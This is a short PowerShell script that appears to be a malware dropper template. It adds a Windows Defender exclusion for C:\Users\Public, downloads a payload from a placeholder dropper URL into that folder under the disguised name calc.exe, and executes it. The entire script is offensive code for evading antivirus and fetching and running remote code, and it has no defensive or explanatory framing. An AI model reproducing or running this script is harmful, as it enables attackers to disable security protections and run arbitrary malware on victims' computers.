$user_name = $env:USERNAME
$exclude_folder = "C:\Users\Public"
$exclude_folde_quoted = '"'+$exclude_folder+'"'
$exploit_path = $exclude_folder + "\calc.exe"
$dropper_url = "YOUR DROPPER URL HERE..."

try
{
    powershell -inputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath $exclude_folde_quoted
    powershell.exe "wget $dropper_url" -o "$exploit_path"
    sleep 3
    Invoke-Expression $exploit_path
}
catch [System.Exception] 
{
    Write-Output("Exception")
    exit
}
